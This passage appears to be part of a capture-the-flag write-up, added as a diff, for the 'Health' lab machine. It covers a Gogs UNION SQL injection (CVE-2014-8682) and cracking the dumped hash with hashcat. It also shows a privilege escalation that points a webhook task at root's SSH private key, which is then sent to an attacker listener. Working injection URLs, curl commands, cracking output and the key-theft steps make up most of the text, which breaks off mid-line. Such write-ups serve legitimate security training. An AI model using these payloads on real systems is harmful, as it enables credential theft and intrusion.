+<span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">10900</span> <span class="n">sha256</span><span class="p">:</span><span class="mi">10000</span><span class="p">:</span><span class="n">TEVkaUVVMFdvYg</span><span class="o">==</span><span class="p">:</span><span class="n">vDVvLqxBwI6YEdRSX6e8ULfOoq4H2CzCy5VBKAfhdzZSXc</span><span class="o">/</span><span class="n">Jb29x5eZbZuP3Pac5l2E</span><span class="o">=</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<p>ok, so we now know what we need to extract with the SQLi and how to crack the password</p>
+</section>
+<section id="manual-union-sqli-cve-2014-8682">
+<h2>Manual Union SQLi - CVE-2014-8682<a class="headerlink" href="#manual-union-sqli-cve-2014-8682" title="Permalink to this heading">#</a></h2>
+<p>according to the vulnerability report this is the vulnerable code</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="c1">// SearchUserByName returns given number of users whose name contains</span>
+<span class="nx">keyword</span><span class="p">.</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">SearchUserByName</span><span class="p">(</span><span class="nx">opt</span><span class="w"> </span><span class="nx">SearchOption</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">us</span><span class="w"> </span><span class="p">[]</span><span class="o">*</span><span class="nx">User</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">FilterSQLInject</span><span class="p">(</span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">us</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">ToLower</span><span class="p">(</span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="p">)</span>
+
+<span class="w">    </span><span class="nx">us</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nb">make</span><span class="p">([]</span><span class="o">*</span><span class="nx">User</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Limit</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">Limit</span><span class="p">(</span><span class="nx">opt</span><span class="p">.</span><span class="nx">Limit</span><span class="p">).</span><span class="nx">Where</span><span class="p">(</span><span class="s">&quot;type=0&quot;</span><span class="p">).</span><span class="nx">And</span><span class="p">(</span><span class="s">&quot;lower_name like &#39;%&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;%&#39;&quot;</span><span class="p">).</span><span class="nx">Find</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">us</span><span class="p">)</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">us</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>The proposed fix is to use a prepared statement, instead of a simple string concatenation, pretty classic.</p>
+<div class="highlight-go notranslate"><div class="highlight"><pre><span></span><span class="nx">err</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">x</span><span class="p">.</span><span class="nx">Limit</span><span class="p">(</span><span class="nx">opt</span><span class="p">.</span><span class="nx">Limit</span><span class="p">).</span><span class="nx">Where</span><span class="p">(</span><span class="s">&quot;type=0&quot;</span><span class="p">).</span><span class="nx">And</span><span class="p">(</span><span class="s">&quot;lower_name like ?&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">opt</span><span class="p">.</span><span class="nx">Keyword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;%&quot;</span><span class="p">).</span><span class="nx">Find</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">us</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>The query is done with XORM - eXtra ORM for Go, ORM stands for Object-Relational-Mapper, Object-relational-mapping is the idea of being able to write SQL queries using the object-oriented paradigm of your preferred programming language. So at a glance the query should look approximately like that:</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="p">(</span><span class="k">type</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">lower_name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&lt;keyword&gt;%&#39;</span><span class="p">);</span>
+</pre></div>
+</div>
+<p>That’s the proof of concept, in the report, we’ll need to tweak it as it’s using mysql and not sqlite</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://www.example.com/api/v1/users/search?q=&#39;/**/and/**/false)/**/union/**/select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/mysql.db/**/where/**/(&#39;%25&#39;%3D&#39;
+</pre></div>
+</div>
+<p>playing on the local instance:<br />
+union all does not drop duplicates<br />
+&#64;&#64;version of course is only relevant for mysql, since  we’re working on a sqlite.db we can use <code class="docutils literal notranslate"><span class="pre">select</span> <span class="pre">sqlite_version()</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">'%25'%3D</span></code> is <code class="docutils literal notranslate"><span class="pre">'%'=</span></code> to escape the <code class="docutils literal notranslate"><span class="pre">%'</span></code> at the end, so that the where clause is <code class="docutils literal notranslate"><span class="pre">'%'='%'</span></code> meaning it’s always true<br />
+<code class="docutils literal notranslate"><span class="pre">/**/</span></code> are empty comments, but will work as spaces if it was just a urlencode issue we could have used + but the code actually filters down spaces</p>
+<p>We got it working on the sqlite3 cli:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">user</span> <span class="n">where</span> <span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="mi">0</span> <span class="ow">and</span> <span class="n">lower_name</span> <span class="n">like</span> <span class="s1">&#39;%blnkn%&#39;</span><span class="p">);</span>
+<span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">user</span> <span class="n">where</span> <span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="mi">0</span> <span class="ow">and</span> <span class="n">lower_name</span> <span class="n">like</span> <span class="s1">&#39;%blnkn&#39;</span> <span class="ow">and</span> <span class="n">false</span><span class="p">)</span> <span class="n">union</span> <span class="nb">all</span> <span class="n">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,(</span><span class="n">select</span> <span class="n">sqlite_version</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="kn">from</span> <span class="nn">user</span> <span class="n">where</span> <span class="s1">&#39;%&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>And we got it working on our local gogs instance</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://192.168.0.73:3000/api/v1/users/search?q=&#39;/**/and/**/name)/**/union/**/all/**/select/**/1,1,(select/**/name/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/user/**/where/**/(&#39;%25&#39;%3D&#39;&quot;</span><span class="p">|</span>jq<span class="w"> </span>.data<span class="o">[</span><span class="m">0</span><span class="o">]</span>.username
+<span class="s2">&quot;blnkn&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://192.168.0.73:3000/api/v1/users/search?q=&#39;/**/and/**/name)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/user/**/where/**/(&#39;%25&#39;%3D&#39;&quot;</span><span class="p">|</span>jq<span class="w"> </span>.data<span class="o">[</span><span class="m">0</span><span class="o">]</span>.username
+<span class="s2">&quot;bc356f2eac41c08e9811d4525fa7bc50b7cea2ae07d82cc2cb95412807e17736525dcfc96f6f71e5e65b66e3f73da7399761&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;http://192.168.0.73:3000/api/v1/users/search?q=&#39;/**/and/**/name)/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/user/**/where/**/(&#39;%25&#39;%3D&#39;&quot;</span><span class="p">|</span>jq<span class="w"> </span>.data<span class="o">[</span><span class="m">0</span><span class="o">]</span>.username
+<span class="s2">&quot;LEdiEU0Wob&quot;</span>
+</pre></div>
+</div>
+<p>Now getting that from the remote, through the redirect</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>redirect.py<span class="w"> </span><span class="s2">&quot;http://127.0.0.1:3000/api/v1/users/search?q=&#39;/**/and/**/name)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/user/**/where/**/(&#39;%25&#39;%3D&#39;&quot;</span>
+<span class="m">10</span>.10.11.176<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">17</span>/Sep/2022<span class="w"> </span><span class="m">22</span>:27:08<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>redirect.py<span class="w"> </span><span class="s2">&quot;http://127.0.0.1:3000/api/v1/users/search?q=&#39;/**/and/**/name)/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/user/**/where/**/(&#39;%25&#39;%3D&#39;&quot;</span>
+<span class="m">10</span>.10.11.176<span class="w"> </span>-<span class="w"> </span>-<span class="w"> </span><span class="o">[</span><span class="m">17</span>/Sep/2022<span class="w"> </span><span class="m">22</span>:25:18<span class="o">]</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0&quot;</span><span class="w"> </span><span class="m">302</span><span class="w"> </span>-
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sO3XIbeW14
+</pre></div>
+</div>
+</section>
+<section id="cracking-the-real-hash">
+<h2>Cracking the real hash<a class="headerlink" href="#cracking-the-real-hash" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37&quot;</span><span class="p">|</span>xxd<span class="w"> </span>-r<span class="w"> </span>-p<span class="p">|</span>base64
+
+ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;sO3XIbeW14&quot;</span><span class="p">|</span>base64
+<span class="nv">c08zWEliZVcxNA</span><span class="o">==</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">10900</span><span class="w"> </span>sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span><span class="w"> </span>/usr/share/wordlists/rockyou.txt
+
+sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc<span class="o">=</span>:february15
+
+Session..........:<span class="w"> </span>hashcat
+Status...........:<span class="w"> </span>Cracked
+Hash.Mode........:<span class="w"> </span><span class="m">10900</span><span class="w"> </span><span class="o">(</span>PBKDF2-HMAC-SHA256<span class="o">)</span>
+Hash.Target......:<span class="w"> </span>sha256:10000:c08zWEliZVcxNA<span class="o">==</span>:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc<span class="o">=</span>
+Time.Started.....:<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">22</span>:31:28<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="o">(</span><span class="m">34</span><span class="w"> </span>secs<span class="o">)</span>
+Time.Estimated...:<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">22</span>:32:02<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="o">(</span><span class="m">0</span><span class="w"> </span>secs<span class="o">)</span>
+Kernel.Feature...:<span class="w"> </span>Pure<span class="w"> </span>Kernel
+Guess.Base.......:<span class="w"> </span>File<span class="w"> </span><span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
+Speed.#1.........:<span class="w">     </span><span class="m">2077</span><span class="w"> </span>H/s<span class="w"> </span><span class="o">(</span><span class="m">5</span>.94ms<span class="o">)</span><span class="w"> </span>@<span class="w"> </span>Accel:64<span class="w"> </span>Loops:512<span class="w"> </span>Thr:1<span class="w"> </span>Vec:4
+Recovered........:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span><span class="w"> </span>Digests
+Progress.........:<span class="w"> </span><span class="m">71168</span>/14344385<span class="w"> </span><span class="o">(</span><span class="m">0</span>.50%<span class="o">)</span>
+Rejected.........:<span class="w"> </span><span class="m">0</span>/71168<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00%<span class="o">)</span>
+Restore.Point....:<span class="w"> </span><span class="m">70912</span>/14344385<span class="w"> </span><span class="o">(</span><span class="m">0</span>.49%<span class="o">)</span>
+Restore.Sub.#1...:<span class="w"> </span>Salt:0<span class="w"> </span>Amplifier:0-1<span class="w"> </span>Iteration:9728-9999
+Candidate.Engine.:<span class="w"> </span>Device<span class="w"> </span>Generator
+Candidates.#1....:<span class="w"> </span>fullysick<span class="w"> </span>-&gt;<span class="w"> </span>citadel
+
+Started:<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">22</span>:31:27<span class="w"> </span><span class="m">2022</span>
+Stopped:<span class="w"> </span>Sat<span class="w"> </span>Sep<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">22</span>:32:03<span class="w"> </span><span class="m">2022</span>
+</pre></div>
+</div>
+<p>that password is also valid as an ssh password for susanne</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>susanne@health:~$<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>user.txt
+<span class="m">33</span><span class="w"> </span>user.txt
+</pre></div>
+</div>
+</section>
+<section id="privesc-manipulating-the-mysql-db">
+<h2>Privesc manipulating the  MySQL db<a class="headerlink" href="#privesc-manipulating-the-mysql-db" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>DB_<span class="w"> </span>/var/www/html/.env
+<span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
+<span class="nv">DB_HOST</span><span class="o">=</span><span class="m">127</span>.0.0.1
+<span class="nv">DB_PORT</span><span class="o">=</span><span class="m">3306</span>
+<span class="nv">DB_DATABASE</span><span class="o">=</span>laravel
+<span class="nv">DB_USERNAME</span><span class="o">=</span>laravel
+<span class="nv">DB_PASSWORD</span><span class="o">=</span>MYsql_strongestpass@2014+
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql<span class="w"> </span>-D<span class="w"> </span>laravel<span class="w"> </span>-u<span class="w"> </span>laravel<span class="w"> </span>-p
+mysql&gt;<span class="w"> </span>show<span class="w"> </span>databases<span class="p">;</span>
++--------------------+
+<span class="p">|</span><span class="w"> </span>Database<span class="w">           </span><span class="p">|</span>
++--------------------+
+<span class="p">|</span><span class="w"> </span>information_schema<span class="w"> </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>laravel<span class="w">            </span><span class="p">|</span>
++--------------------+
+<span class="m">2</span><span class="w"> </span>rows<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+
+mysql&gt;<span class="w"> </span>use<span class="w"> </span>laravel<span class="p">;</span>
+Database<span class="w"> </span>changed
+mysql&gt;<span class="w"> </span>show<span class="w"> </span>tables<span class="p">;</span>
++------------------------+
+<span class="p">|</span><span class="w"> </span>Tables_in_laravel<span class="w">      </span><span class="p">|</span>
++------------------------+
+<span class="p">|</span><span class="w"> </span>failed_jobs<span class="w">            </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>migrations<span class="w">             </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>password_resets<span class="w">        </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>personal_access_tokens<span class="w"> </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>tasks<span class="w">                  </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>users<span class="w">                  </span><span class="p">|</span>
++------------------------+
+<span class="m">6</span><span class="w"> </span>rows<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+
+mysql&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>users<span class="p">;</span>
+Empty<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+</pre></div>
+</div>
+<p>there’s no users here because that’s the database for the health app<br />
+but, if we create a webhook through the webapp we can see the tasks beeing created in the DB</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>tasks<span class="p">;</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>id<span class="w">                                   </span><span class="p">|</span><span class="w"> </span>webhookUrl<span class="w">               </span><span class="p">|</span><span class="w"> </span>onlyError<span class="w"> </span><span class="p">|</span><span class="w"> </span>monitoredUrl<span class="w">             </span><span class="p">|</span><span class="w"> </span>frequency<span class="w">   </span><span class="p">|</span><span class="w"> </span>created_at<span class="w">          </span><span class="p">|</span><span class="w"> </span>updated_at<span class="w">          </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>509cefcd-8058-4f41-b3d7-a8200e6c181d<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.14.166:9000<span class="w"> </span><span class="p">|</span><span class="w">         </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.14.166:8000<span class="w"> </span><span class="p">|</span><span class="w"> </span>*/1<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">21</span>:51:24<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">21</span>:51:24<span class="w"> </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+</pre></div>
+</div>
+<p>so if we’re quick enough we can update those tasks and instead of monitoring a validated url<br />
+we can set watever we want here without any restrictions, so we can just dump the private ssh key for root</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mysql&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>tasks<span class="p">;</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>id<span class="w">                                   </span><span class="p">|</span><span class="w"> </span>webhookUrl<span class="w">               </span><span class="p">|</span><span class="w"> </span>onlyError<span class="w"> </span><span class="p">|</span><span class="w"> </span>monitoredUrl<span class="w">             </span><span class="p">|</span><span class="w"> </span>frequency<span class="w">   </span><span class="p">|</span><span class="w"> </span>created_at<span class="w">          </span><span class="p">|</span><span class="w"> </span>updated_at<span class="w">          </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>447cb497-ac06-43fe-a059-8380b9084668<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.14.166:9000<span class="w"> </span><span class="p">|</span><span class="w">         </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.14.166:8000<span class="w"> </span><span class="p">|</span><span class="w"> </span>*/1<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">22</span>:01:24<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">22</span>:01:24<span class="w"> </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+
+mysql&gt;<span class="w"> </span>update<span class="w"> </span>tasks<span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="nv">monitoredUrl</span><span class="o">=</span><span class="s1">&#39;file:///root/.ssh/id_rsa&#39;</span><span class="p">;</span>
+Query<span class="w"> </span>OK,<span class="w"> </span><span class="m">1</span><span class="w"> </span>row<span class="w"> </span>affected<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+Rows<span class="w"> </span>matched:<span class="w"> </span><span class="m">1</span><span class="w">  </span>Changed:<span class="w"> </span><span class="m">1</span><span class="w">  </span>Warnings:<span class="w"> </span><span class="m">0</span>
+
+mysql&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>tasks<span class="p">;</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>id<span class="w">                                   </span><span class="p">|</span><span class="w"> </span>webhookUrl<span class="w">               </span><span class="p">|</span><span class="w"> </span>onlyError<span class="w"> </span><span class="p">|</span><span class="w"> </span>monitoredUrl<span class="w">             </span><span class="p">|</span><span class="w"> </span>frequency<span class="w">   </span><span class="p">|</span><span class="w"> </span>created_at<span class="w">          </span><span class="p">|</span><span class="w"> </span>updated_at<span class="w">          </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="p">|</span><span class="w"> </span>447cb497-ac06-43fe-a059-8380b9084668<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://10.10.14.166:9000<span class="w"> </span><span class="p">|</span><span class="w">         </span><span class="m">0</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>file:///root/.ssh/id_rsa<span class="w"> </span><span class="p">|</span><span class="w"> </span>*/1<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">22</span>:01:24<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="m">2022</span>-09-17<span class="w"> </span><span class="m">22</span>:01:24<span class="w"> </span><span class="p">|</span>
++--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+<span class="m">1</span><span class="w"> </span>row<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span><span class="o">(</span><span class="m">0</span>.00<span class="w"> </span>sec<span class="o">)</span>
+</pre></div>
+</div>
+<p>and we get that back in our netcat listenet on 9000</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print(&quot;-----BEGIN RSA PRIVATE 